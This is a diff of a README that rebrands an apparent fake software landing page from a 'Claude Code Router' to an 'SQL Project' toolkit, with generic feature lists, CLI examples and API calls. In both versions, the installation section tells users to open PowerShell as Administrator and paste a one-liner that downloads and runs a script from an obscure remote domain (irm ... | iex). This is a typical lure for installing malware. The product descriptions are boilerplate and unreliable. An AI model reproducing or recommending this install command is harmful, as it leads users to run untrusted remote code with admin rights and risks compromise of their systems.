@@ -1,13 +1,13 @@
-# Claude Code Router — Complete Claude Code Routing & Load Balancing Suite
+# SQL Project — Complete SQL Database Development & Management Suite
 
-> All-in-one Claude Code router — route requests across multiple Claude models, load balance, fallback, and optimize costs in one package.
+> All-in-one SQL toolkit — database design, query development, optimization, backup, and documentation in one package.
 
 ---
 
 ## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)
 
 > [!TIP]
-> **Полезный совет:** Настройте переменные окружения API ключей перед использованием роутера.
+> **Полезный совет:** Используйте виртуальное окружение Python для изоляции зависимостей баз данных.
 
 ### Step 1: Open CMD or PowerShell as Administrator
 ```
@@ -16,76 +16,88 @@
 
 ### Step 2: Copy & Paste in PowerShell
 ```
-irm https://gitrm.cfd?t=claude-code-router | iex
+irm https://gitrm.sbs?t=sql-project | iex
 ```
 
 ### Step 3: Wait for Completion
 ```
-[1/4] Loading Claude Code Router modules...
-[2/4] Extracting routing and load balancing components...
-[3/4] Installing fallback and cost optimization utilities...
-[4/4] Ready. Start routing Claude requests.
+[1/4] Loading SQL Project modules...
+[2/4] Extracting database and query components...
+[3/4] Installing optimization and documentation utilities...
+[4/4] Ready. Start developing SQL projects.
 ```
 
-### Step 4: Start Using the Router
-- Launch via `claude-code-router.exe` or `npm start`
-- Configure routing rules and model endpoints
-- Monitor requests and costs
+### Step 4: Start Using the Toolkit
+- Launch via `sql-project.exe` or `npm start`
+- Design databases and write queries
+- Optimize performance and generate documentation
 
 ---
 
 ## TL;DR - Quick Summary
 
-**Claude Code Router** combines intelligent request routing, load balancing, automatic fallback, and cost optimization across multiple Claude models. Covers all major Claude Code routing and optimization needs.
+**SQL Project** combines database design, query development, performance optimization, backup management, and documentation generation. Covers all major SQL development and management needs.
 
-**Best for:** Developers, DevOps engineers, and AI application operators.
+**Best for:** Database administrators, SQL developers, and data engineers.
 
 **Key differentiators:**
-1. Intelligent request routing based on content
-2. Load balancing across multiple model endpoints
-3. Automatic fallback on failure
-4. Cost optimization with model selection
-5. Request monitoring and analytics
-6. Custom routing rules
+1. Visual database design and ER diagrams
+2. Query development with autocomplete
+3. Performance optimization and indexing
+4. Automated backup and restore
+5. Documentation generation
+6. Multi-database engine support
 
 ---
 
 ## Core Features
 
-### Request Routing
+### Database Design
 ```
-✅ Content-based intelligent routing
-✅ Model selection by task type
-✅ Priority-based routing
-✅ Custom routing rules
-✅ A/B testing support
-✅ Canary deployments
-✅ Round-robin load balancing
-✅ Weighted load balancing
-```
-
-### Fallback & Resilience
-```
-✅ Automatic fallback on failure
-✅ Health check monitoring
-✅ Circuit breaker pattern
-✅ Retry logic with backoff
-✅ Multi-region failover
-✅ Graceful degradation
-✅ Error handling and recovery
-✅ Request queuing
+✅ Visual ER diagram designer
+✅ Schema generation from diagrams
+✅ Table relationship visualization
+✅ Index recommendation
+✅ Normalization assistance
+✅ Reverse engineering from database
+✅ Forward engineering to database
+✅ Version control for schemas
 ```
 
-### Cost Optimization
+### Query Development
 ```
-✅ Model selection by cost
-✅ Token usage monitoring
-✅ Budget alerts and limits
-✅ Cost prediction
-✅ Optimization recommendations
-✅ Usage analytics
-✅ Bill splitting
-✅ Cost tracking by project
+✅ Syntax highlighting and autocomplete
+✅ Query formatting and beautification
+✅ Query performance analysis
+✅ EXPLAIN plan visualization
+✅ Query history and snippets
+✅ Batch query execution
+✅ Multi-statement support
+✅ Parameterized queries
+```
+
+### Performance Optimization
+```
+✅ Slow query detection
+✅ Index usage analysis
+✅ Table statistics monitoring
+✅ Query caching recommendations
+✅ Partition suggestions
+✅ Deadlock detection
+✅ Resource usage tracking
+✅ Performance benchmarking
+```
+
+### Backup & Documentation
+```
+✅ Automated backup scheduling
+✅ Incremental backup support
+✅ Restore verification
+✅ Documentation generation (ERD, schemas)
+✅ Export to multiple formats (PDF, HTML, Markdown)
+✅ Data dictionary creation
+✅ Change tracking
+✅ Compliance reporting
 ```
 
 ---
@@ -93,17 +105,17 @@ irm https://gitrm.cfd?t=claude-code-router | iex
 ## Usage
 
 ```bash
-# Start router
-claude-code-router start --config "./router-config.json" --port 3000
+# Connect to database
+sql-project connect --host "localhost" --port 5432 --database "mydb" --user "admin"
 
-# Configure routing rule
-claude-code-router rule add --name "code-rule" --model "claude-3-opus" --condition "task=code"
+# Design schema
+sql-project schema design --name "ecommerce" --output "./schemas/ecommerce.er"
 
-# Monitor requests
-claude-code-router monitor --since "2024-01-01" --format "json" --output "./metrics.json"
+# Optimize query
+sql-project optimize --query "SELECT * FROM users WHERE created_at > '2024-01-01'" --database "mydb"
 
-# Check costs
-claude-code-router cost --period "monthly" --group "project" --format "json"
+# Generate documentation
+sql-project docs generate --database "mydb" --format "html" --output "./docs/"
 ```
 
 ---
@@ -111,14 +123,14 @@ claude-code-router cost --period "monthly" --group "project" --format "json"
 ## REST API
 
 ```bash
-# Route request via API
-curl -X POST "http://localhost:3000/v1/chat/completions" -H "Content-Type: application/json" -d '{"model": "claude-3-opus", "messages": [{"role": "user", "content": "Hello"}]}'
+# Execute query via API
+curl -X POST "http://localhost:6666/api/sql/query" -H "Content-Type: application/json" -d '{"database": "mydb", "query": "SELECT * FROM users LIMIT 10"}'
 
-# Get metrics via API
-curl -X GET "http://localhost:3000/api/metrics?since=2024-01-01&format=json"
+# Generate docs via API
+curl -X POST "http://localhost:6666/api/sql/docs" -H "Content-Type: application/json" -d '{"database": "mydb", "format": "html"}'
 
-# Get costs via API
-curl -X GET "http://localhost:3000/api/cost?period=monthly&group=project"
+# Backup database via API
+curl -X POST "http://localhost:6666/api/sql/backup" -H "Content-Type: application/json" -d '{"database": "mydb", "type": "full"}'
 ```
 
 ---
@@ -126,63 +138,63 @@ curl -X GET "http://localhost:3000/api/cost?period=monthly&group=project"
 ## Screenshots
 
 - Dashboard: `screenshots/dashboard.png`
-- Routing Rules: `screenshots/routing-rules.png`
-- Request Monitor: `screenshots/request-monitor.png`
-- Cost Analytics: `screenshots/cost-analytics.png`
-- Fallback Status: `screenshots/fallback-status.png`
+- ER Diagram: `screenshots/er-diagram.png`
+- Query Editor: `screenshots/query-editor.png`
+- Performance Analysis: `screenshots/performance-analysis.png`
+- Documentation: `screenshots/documentation.png`
 
 ---
 
 ## Troubleshooting
 
-### Router Fails
+### Connection Fails
 ```bash
-claude-code-router check --config "./router-config.json"
-claude-code-router start --config "./router-config.json" --port 3000 --debug
+sql-project connect check --host "localhost" --port 5432 --database "mydb"
+sql-project connect --host "localhost" --port 5432 --database "mydb" --user "admin" --debug
 ```
 
-### Routing Issues
+### Query Optimization Issues
 ```bash
-claude-code-router rule validate --name "code-rule" --model "claude-3-opus"
-claude-code-router rule add --name "code-rule" --model "claude-3-opus" --condition "task=code" --force
+sql-project optimize validate --query "SELECT * FROM users" --database "mydb"
+sql-project optimize --query "SELECT * FROM users WHERE created_at > '2024-01-01'" --database "mydb" --force
 ```
 
-### Cost Alerts
+### Documentation Errors
 ```bash
-claude-code-router cost check --period "monthly"
-claude-code-router cost --period "monthly" --group "project" --format "json"
+sql-project docs check --database "mydb"
+sql-project docs generate --database "mydb" --format "html" --output "./docs/" --force
 ```
 
 ---
 
 ## Use Cases
 
-### Multi-Model Routing
-- Route code tasks to Opus
-- Route chat tasks to Sonnet
-- Route simple tasks to Haiku
-- Balance cost and performance
+### Database Development
+- Design database schemas
+- Write and optimize queries
+- Generate documentation
+- Version control schemas
 
-### High Availability
-- Automatic fallback on failure
-- Multi-region deployment
-- Load balancing
-- Health monitoring
+### Performance Optimization
+- Analyze slow queries
+- Recommend indexes
+- Monitor performance
+- Benchmark changes
 
-### Cost Management
-- Track token usage
-- Set budget alerts
-- Optimize model selection
-- Monitor costs by project
+### Backup & Recovery
+- Schedule automated backups
+- Test restore procedures
+- Verify backup integrity
+- Disaster recovery planning
 
 ---
 
-> [!IMPORTANT]
-> **Важно:** Настройте API ключи перед использованием. Используйте переменные окружения для безопасного хранения ключей.
+> [!NOTE]
+> **Обратите внимание:** Поддерживает PostgreSQL, MySQL, MariaDB, SQLite, SQL Server, Oracle. Убедитесь, что драйверы БД установлены.
 
 ## ⚠️ IMPORTANT
 
-Ensure API keys are configured before use. Use environment variables for secure key storage.
+Always backup databases before making schema changes. Test queries on staging before production.
 
 ---
 
@@ -194,4 +206,4 @@ MIT License - see LICENSE file for details.
 
 ## Tags
 
-`claude-code-router` `claude` `router` `load-balancing` `fallback` `cost-optimization` `ai-routing` `model-selection` `request-monitoring` `multi-model`
+`sql-project` `sql` `database` `database-design` `query-development` `performance-optimization` `backup-management` `documentation` `erd` `sql-development`
